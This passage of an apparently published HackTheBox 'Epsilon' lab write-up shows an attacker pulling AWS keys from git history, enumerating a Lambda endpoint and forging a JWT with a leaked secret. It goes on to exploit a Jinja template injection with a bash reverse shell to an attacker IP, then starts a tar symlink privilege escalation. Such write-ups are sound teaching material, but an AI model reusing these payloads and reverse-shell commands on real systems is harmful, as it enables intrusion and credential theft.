+            <span class="n">full_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+            <span class="n">archive_name</span> <span class="o">=</span> <span class="n">full_path</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">sep</span><span class="p">):]</span>
+            <span class="k">yield</span> <span class="n">full_path</span><span class="p">,</span> <span class="n">archive_name</span>
+
+
+<span class="k">def</span> <span class="nf">make_zip_file_bytes</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nc">BytesIO</span><span class="p">()</span>
+    <span class="k">with</span> <span class="nc">ZipFile</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">full_path</span><span class="p">,</span> <span class="n">archive_name</span> <span class="ow">in</span> <span class="nf">files_to_zip</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">path</span><span class="p">):</span>
+            <span class="n">z</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">full_path</span><span class="p">,</span> <span class="n">archive_name</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">buf</span><span class="p">.</span><span class="nf">getvalue</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">update_lambda</span><span class="p">(</span><span class="n">lambda_name</span><span class="p">,</span> <span class="n">lambda_code_path</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isdir</span><span class="p">(</span><span class="n">lambda_code_path</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">'</span><span class="s">Lambda directory does not exist: {0}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">lambda_code_path</span><span class="p">))</span>
+    <span class="n">aws_lambda</span><span class="p">.</span><span class="nf">update_function_code</span><span class="p">(</span>
+        <span class="n">FunctionName</span><span class="o">=</span><span class="n">lambda_name</span><span class="p">,</span>
+        <span class="n">ZipFile</span><span class="o">=</span><span class="nf">make_zip_file_bytes</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">lambda_code_path</span><span class="p">))</span>
+</code></pre></div></div>
+<p>Specifically, the <code class="language-plaintext highlighter-rouge">update_lambda</code> function seems to modify AWS serverless functions, called Lambda.</p>
+<p>The key information is blanked out. I will note the <code class="language-plaintext highlighter-rouge">endpoint_url</code>, <code class="language-plaintext highlighter-rouge">http://cloud.epsilon.htb</code>, and add that to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+<h4 id="past-commits">Past Commits</h4>
+<p><code class="language-plaintext highlighter-rouge">git log</code> shows there are four commits:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git log <span class="nt">--oneline</span> 
+<span class="go">c622771 (HEAD -&gt; master) Fixed Typo
+b10dd06 Adding Costume Site
+c514416 Updating Tracking API
+7cf92a7 Adding Tracking API Module
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">git diff [a] [b]</code> will show what changed between two commits. It reads better if the older commit is a. So for example, the last commit that “Fixed Typo” seems to have corrected an issue in the url:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>git diff b10dd06 c622771
+<span class="go">diff --git a/track_api_CR_148.py b/track_api_CR_148.py
+index 545f6fe..8d3b52e 100644
+</span><span class="diff-removed">--- a/track_api_CR_148.py
+</span><span class="diff-added">+++ b/track_api_CR_148.py
+</span><span class="diff-lines">@@ -8,8 +8,8 @@ session = Session(
+</span><span class="go">     aws_access_key_id='&lt;aws_access_key_id&gt;',
+     aws_secret_access_key='&lt;aws_secret_access_key&gt;',
+     region_name='us-east-1',
+</span><span class="diff-removed">-    endpoint_url='http://cloud.epsilong.htb')
+-aws_lambda = session.client('lambda')    
+</span><span class="diff-added">+    endpoint_url='http://cloud.epsilon.htb')
++aws_lambda = session.client('lambda')
+</span></code></pre></div></div>
+<p>Going back another commit (<code class="language-plaintext highlighter-rouge">git diff c514416 b10dd06</code>), this just adds the costume site just like it is in the source I already looked at.</p>
+<p>The next commit back, it looks like they removed the AWS creds:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>git diff 7cf92a7 c514416
+<span class="go">diff --git a/track_api_CR_148.py b/track_api_CR_148.py
+index fed7ab9..545f6fe 100644
+</span><span class="diff-removed">--- a/track_api_CR_148.py
+</span><span class="diff-added">+++ b/track_api_CR_148.py
+</span><span class="diff-lines">@@ -5,8 +5,8 @@ from boto3.session import Session
+</span><span class="go"> 
+ 
+ session = Session(
+</span><span class="diff-removed">-    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+-    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+</span><span class="diff-added">+    aws_access_key_id='&lt;aws_access_key_id&gt;',
++    aws_secret_access_key='&lt;aws_secret_access_key&gt;',
+</span><span class="go">     region_name='us-east-1',
+     endpoint_url='http://cloud.epsilong.htb')
+ aws_lambda = session.client('lambda') 
+</span></code></pre></div></div>
+<h2 id="shell-as-tom">Shell as tom</h2>
+<h3 id="lambda">Lambda</h3>
+<h4 id="configure-awscli">Configure awscli</h4>
+<p>I’ve exploited AWS (and AWS-like interfaces like LocalStack) before on HTB (in <a href="/2021/08/30/htb-gobox.html#enumeration">Gobox</a> and <a href="/2021/04/24/htb-bucket.html#aws-overview">Bucket</a>). This is the first time I’ve shown interaction with Lambda. I’ll use the <code class="language-plaintext highlighter-rouge">aws</code> command line too (<code class="language-plaintext highlighter-rouge">apt install awscli</code>) to connect to this instance.</p>
+<p>First I need to configure with the secrets:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws configure
+<span class="gp">AWS Access Key ID [None]:</span><span class="w"> </span>AQLA5M37BDN6FJP76TDC
+<span class="gp">AWS Secret Access Key [None]:</span><span class="w"> </span>OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
+<span class="gp">Default region name [None]:</span><span class="w"> </span>us-east-1
+<span class="gp">Default output format [None]:</span><span class="w"> 
+</span></code></pre></div></div>
+<h4 id="explore-lambda">Explore Lambda</h4>
+<p>Given the references above to Lambda, I’ll start there. Running <code class="language-plaintext highlighter-rouge">aws help</code> shows that <code class="language-plaintext highlighter-rouge">lambda</code> is one of the subcommands for <code class="language-plaintext highlighter-rouge">aws</code>. For each <code class="language-plaintext highlighter-rouge">aws</code> command, I’ll need to give it <code class="language-plaintext highlighter-rouge">--endpoint-url=http://cloud.epsilon.htb</code> so that it talks to the HTB machine and not to actual AWS.</p>
+<p><code class="language-plaintext highlighter-rouge">aws lambda help</code> gives a list of commands for interacting with Lambda. <code class="language-plaintext highlighter-rouge">list-functions</code> seems like a good place to start:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda list-functions <span class="nt">--endpoint-url</span><span class="o">=</span>http://cloud.epsilon.htb 
+<span class="go">{
+    "Functions": [
+        {
+            "FunctionName": "costume_shop_v1",
+            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+            "Runtime": "python3.7",
+            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+            "Handler": "my-function.handler",
+            "CodeSize": 478,
+            "Description": "",
+            "Timeout": 3,
+            "LastModified": "2022-03-09T18:40:07.722+0000",
+            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
+            "Version": "$LATEST",
+            "VpcConfig": {},
+            "TracingConfig": {
+                "Mode": "PassThrough"
+            },
+            "RevisionId": "8dc3e57d-61f2-45c6-af28-a45947aca34f",
+            "State": "Active",
+            "LastUpdateStatus": "Successful"
+        }
+    ]
+}
+</span></code></pre></div></div>
+<p>There’s only one function, <code class="language-plaintext highlighter-rouge">costume_shop_v1</code>. To get the code, I need the location, which I can find with <code class="language-plaintext highlighter-rouge">get-function</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda get-function <span class="nt">--function-name</span><span class="o">=</span>costume_shop_v1 <span class="nt">--endpoint-url</span><span class="o">=</span>http://cloud.epsilon.htb 
+<span class="go">{
+    "Configuration": {
+        "FunctionName": "costume_shop_v1",
+        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+        "Runtime": "python3.7",
+        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+        "Handler": "my-function.handler",
+        "CodeSize": 478,
+        "Description": "",
+        "Timeout": 3,
+        "LastModified": "2022-03-09T18:40:07.722+0000",
+        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
+        "Version": "$LATEST",
+        "VpcConfig": {},
+        "TracingConfig": {
+            "Mode": "PassThrough"
+        },
+        "RevisionId": "8dc3e57d-61f2-45c6-af28-a45947aca34f",
+        "State": "Active",
+        "LastUpdateStatus": "Successful"
+    },
+    "Code": {
+        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
+    },
+    "Tags": {}
+}
+</span></code></pre></div></div>
+<p>This output looks similar to the first output, but it has <code class="language-plaintext highlighter-rouge">Code</code>, which has the location of the source. I’ll download that:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
+<span class="go">--2022-03-09 20:00:56--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
+Resolving cloud.epsilon.htb (cloud.epsilon.htb)... 10.10.11.134
+Connecting to cloud.epsilon.htb (cloud.epsilon.htb)|10.10.11.134|:80... connected.
+HTTP request sent, awaiting response... 200 
+Length: 478 [application/zip]
+Saving to: ‘code’
+
+code                                                 100%[=====================================================================================================================&gt;]     478  --.-KB/s    in 0s      
+
+2022-03-09 20:00:57 (60.4 MB/s) - ‘code’ saved [478/478]
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>file code 
+<span class="go">code: Zip archive data, at least v2.0 to extract
+</span></code></pre></div></div>
+<p>It comes as a Zip Archive, which contains <code class="language-plaintext highlighter-rouge">lambda_function.py</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>unzip code
+<span class="go">Archive:  code
+  inflating: lambda_function.py  
+</span></code></pre></div></div>
+<p>The code itself isn’t that interesting:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">json</span>
+
+<span class="n">secret</span><span class="o">=</span><span class="sh">'</span><span class="s">RrXCv`mrNe!K!4+5`wYq</span><span class="sh">'</span> <span class="c1">#apigateway authorization for CR-124
+</span>
+<span class="sh">'''</span><span class="s">Beta release for tracking</span><span class="sh">'''</span>
+<span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="nb">id</span><span class="o">=</span><span class="n">event</span><span class="p">[</span><span class="sh">'</span><span class="s">queryStringParameters</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">order_id</span><span class="sh">'</span><span class="p">]</span>
+        <span class="k">if</span> <span class="nb">id</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">{</span>
+               <span class="sh">'</span><span class="s">statusCode</span><span class="sh">'</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
+               <span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">resp</span><span class="p">))</span> <span class="c1">#dynamodb tracking for CR-342
+</span>            <span class="p">}</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">{</span>
+                <span class="sh">'</span><span class="s">statusCode</span><span class="sh">'</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
+                <span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid Order ID</span><span class="sh">'</span><span class="p">)</span>
+            <span class="p">}</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">{</span>
+                <span class="sh">'</span><span class="s">statusCode</span><span class="sh">'</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
+                <span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid Order ID</span><span class="sh">'</span><span class="p">)</span>
+            <span class="p">}</span>
+</code></pre></div></div>
+<p>It seems like perhaps the function will someday be used in the tracking for the application, but for now, it doesn’t do much. It does have a <code class="language-plaintext highlighter-rouge">secret</code> variable though.</p>
+<h3 id="access-costume-site">Access Costume Site</h3>
+<p>I can guess (hope) that perhaps the same secret used in this lambda function is used to sign the JWT for the site. I haven’t been able to get a cookie to verify it, so I’ll just forge one and see if it’s accepted. What’s important about the cookie is that it contain a <code class="language-plaintext highlighter-rouge">username</code> field.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">python</span>
+<span class="go">Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">jwt</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">secret</span> <span class="o">=</span> <span class="sh">"</span><span class="s">RrXCv`mrNe!K!4+5`wYq</span><span class="sh">"</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">({</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0xdf</span><span class="sh">"</span><span class="p">},</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sh">'</span><span class="s">HS256</span><span class="sh">'</span><span class="p">)</span>
+<span class="go">b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjB4ZGYifQ.0kQYuCxPdN6bYT66kYg3lF-fjFRU9YvI30hNN4t77RE'
+</span></code></pre></div></div>
+<p>I’ll also note in the code that the token was taken from the cookie named <code class="language-plaintext highlighter-rouge">auth</code>. I’ll add that cookie in the Firefox dev tools:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220309151115326.png"><img alt="image-20220309151115326" src="https://0xdfimages.gitlab.io/img/image-20220309151115326.png"/><em>Click for full size image</em></a></p>
+<p>On visiting <code class="language-plaintext highlighter-rouge">/home</code>, it doesn’t redirect:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220309151137447.webp" type="image/webp"/>
+<img alt="image-20220309151137447" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220309151137447.png"/>
+</picture>
+<h3 id="ssti">SSTI</h3>
+<h4 id="find">Find</h4>
+<p>I noted during the source analysis that there could be an SSTI in <code class="language-plaintext highlighter-rouge">/order</code>. Visiting that page, there’s a form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220309151229557.webp" type="image/webp"/>
+<img alt="image-20220309151229557" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220309151229557.png"/>
+</picture>
+<p>The costume field is a drop down selection:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220309151247211.webp" type="image/webp"/>
+<img alt="image-20220309151247211" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220309151247211.png"/>
+</picture>
+<p>On submitting, the page updates to show a message under the form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220309151320075.webp" type="image/webp"/>
+<img alt="image-20220309151320075" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220309151320075.png"/>
+</picture>
+<p>The post request looks like:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/order</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.134:5000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">26</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.134:5000</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.134:5000/order</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjB4ZGYifQ.0kQYuCxPdN6bYT66kYg3lF-fjFRU9YvI30hNN4t77RE</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+
+costume=mask&amp;q=1&amp;addr=test
+</code></pre></div></div>
+<h4 id="poc">POC</h4>
+<p>I’ll send that POST to Burp Repeater and try a simple SSTI payload. It worked:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220309151534646.png"><img alt="image-20220309151534646" src="https://0xdfimages.gitlab.io/img/image-20220309151534646.png"/><em>Click for full size image</em></a></p>
+<p>I recently went more in depth looking at <a href="/2022/02/19/htb-bolt.html#ssti">SSTI in Bolt</a> (as well as a Beyond Root <a href="https://www.youtube.com/watch?v=7o1J8vHdlYc">video</a> looking at how various payloads work). For Epsilon, I’ll use:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="n">namespace</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
+</code></pre></div></div>
+<p>It works nicely as well:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220309151753900.png"><img alt="image-20220309151753900" src="https://0xdfimages.gitlab.io/img/image-20220309151753900.png"/><em>Click for full size image</em></a></p>
+<h4 id="shell">Shell</h4>
+<p>I’ll update the payload to:</p>
+<div class="language-python wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">costume</span><span class="o">=</span><span class="p">{{</span> <span class="n">namespace</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">bash -c </span><span class="sh">"</span><span class="s">bash -i &gt;%26 /dev/tcp/10.10.14.8/443 0&gt;%261</span><span class="sh">"'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">q</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">addr</span><span class="o">=</span><span class="n">test</span>
+</code></pre></div></div>
+<p>I’ll need to URL encode the <code class="language-plaintext highlighter-rouge">&amp;</code> character of the POST request will treat it as a break and a new parameter. I’ll use a Bash reverse shell, with <code class="language-plaintext highlighter-rouge">bash -c ''</code> to make sure it’s running in the Bash context (see the end of my deep dive <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">video</a> on this reverse shell for details).</p>
+<p>On submitting in Repeater, it hangs. At my listening <code class="language-plaintext highlighter-rouge">nc</code>, there’s a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.134 38950
+bash: cannot set terminal process group (949): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">tom@epsilon:/var/www/app$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/var/www/app$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, file is /dev/null
+</span><span class="gp">tom@epsilon:/var/www/app$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">tom@epsilon:/var/www/app$</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">9ae137b0************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>There isn’t much else in tom’s home directory. There is an interesting but empty directory at <code class="language-plaintext highlighter-rouge">/opt/backups</code>.</p>
+<p>I’ll upload <a href="https://github.com/DominicBreuker/pspy">pspy</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tom@epsilon:/dev/shm$</span><span class="w"> </span>wget 10.10.14.8/pspy64
+<span class="go">--2022-03-09 20:40:37--  http://10.10.14.8/pspy64
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3078592 (2.9M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64              100%[===================&gt;]   2.94M  3.53MB/s    in 0.8s    
+
+2022-03-09 20:40:38 (3.53 MB/s) - ‘pspy64’ saved [3078592/3078592]
+</span><span class="gp">tom@epsilon:/dev/shm$</span><span class="w"> </span><span class="nb">chmod</span> +x pspy64
+</code></pre></div></div>
+<p>On running, it seems to find <code class="language-plaintext highlighter-rouge">/usr/bin/backup.sh</code> running every minute:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+                                                                                                         
+                                                                                                         
+     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                                                                                            
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                  
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                  
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                  
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                  
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                                                                                             
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                   
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                    
+                   ░           ░ ░                                                                       
+                               ░ ░                                                                       
+                                                                                                                                                                                                                   
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursi
+ve) | [] (non-recursive)
+Draining file system events due to startup...
+done
+...[snip]...
+2022/03/09 20:42:01 CMD: UID=0    PID=3754   | /usr/sbin/CRON -f 
+2022/03/09 20:42:01 CMD: UID=0    PID=3755   | /bin/sh -c /usr/bin/backup.sh 
+2022/03/09 20:42:01 CMD: UID=0    PID=3756   | /bin/bash /usr/bin/backup.sh 
+2022/03/09 20:42:01 CMD: UID=0    PID=3759   | /usr/bin/tar -cvf /opt/backups/462504870.tar /var/www/app/ 
+2022/03/09 20:42:01 CMD: UID=0    PID=3761   | /bin/bash /usr/bin/backup.sh 
+2022/03/09 20:42:01 CMD: UID=0    PID=3760   | sha1sum /opt/backups/462504870.tar 
+2022/03/09 20:42:01 CMD: UID=0    PID=3762   | sleep 5 
+2022/03/09 20:42:06 CMD: UID=0    PID=3763   | 
+2022/03/09 20:42:06 CMD: UID=0    PID=3764   | /usr/bin/tar -chvf /var/backups/web_backups/477319990.tar /opt/backups/checksum /opt/backups/462504870.tar 
+2022/03/09 20:42:06 CMD: UID=0    PID=3765   | 
+...[snip]...
+</code></pre></div></div>
+<p>Just from the PSpy output it looks like the script is running <code class="language-plaintext highlighter-rouge">tar</code>, taking a SHA1 hash, sleeping, checking the checksum, and then doing something else.</p>
+<h3 id="backupsh">backup.sh</h3>
+<p>Because it’s a simple shell script, I can read the contents as text:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nv">file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
+/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
+/usr/bin/tar <span class="nt">-cvf</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> /var/www/app/
+<span class="nb">sha1sum</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f1</span> <span class="o">&gt;</span> /opt/backups/checksum
+<span class="nb">sleep </span>5
+<span class="nv">check_file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
+/usr/bin/tar <span class="nt">-chvf</span> <span class="s2">"/var/backups/web_backups/</span><span class="k">${</span><span class="nv">check_file</span><span class="k">}</span><span class="s2">.tar"</span> /opt/backups/checksum <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span>
+/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">date +%N</code> returns the nanosecond porton of the current time. This effectively gives a random number.</p>
+<p>The script:</p>
+<ul>
+<li>Removes all files and folders in <code class="language-plaintext highlighter-rouge">/opt/backups</code>.</li>
+<li>Creates a Tar archive called <code class="language-plaintext highlighter-rouge">/opt/backups/[date str].tar</code> with the contents of <code class="language-plaintext highlighter-rouge">/var/www/app</code>.</li>
+<li>Creates <code class="language-plaintext highlighter-rouge">/opt/backups/checksum</code> which contains the SHA1 hash of the new <code class="language-plaintext highlighter-rouge">.tar</code> file.</li>
+<li>Sleeps for five seconds</li>
+<li>Create a new Tar archive in <code class="language-plaintext highlighter-rouge">/var/backups/web_backups</code> containing the first archive and the checksum file.</li>
+<li>Remove all files and folders from <code class="language-plaintext highlighter-rouge">/opt/backups</code>.</li>
+</ul>
+<p>The second <code class="language-plaintext highlighter-rouge">tar</code> command adds <code class="language-plaintext highlighter-rouge">-h</code> to the parameters. From the <a href="https://man7.org/linux/man-pages/man1/tar.1.html">man page</a>:</p>
+<blockquote>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-h, --dereference
+    Follow symlinks; archive and dump the files they point to.
+</code></pre></div> </div>
+</blockquote>
+<h3 id="exploit">Exploit</h3>
+<p>To exploit this, I’m going to use a Bash loop to watch for the <code class="language-plaintext highlighter-rouge">checksum</code> file, and replace it with a symbolic link to <code class="language-plaintext highlighter-rouge">/root</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> :<span class="p">;</span> <span class="k">do 
+    if </span><span class="nb">test</span> <span class="nt">-f</span> checksum<span class="p">;</span> <span class="k">then 
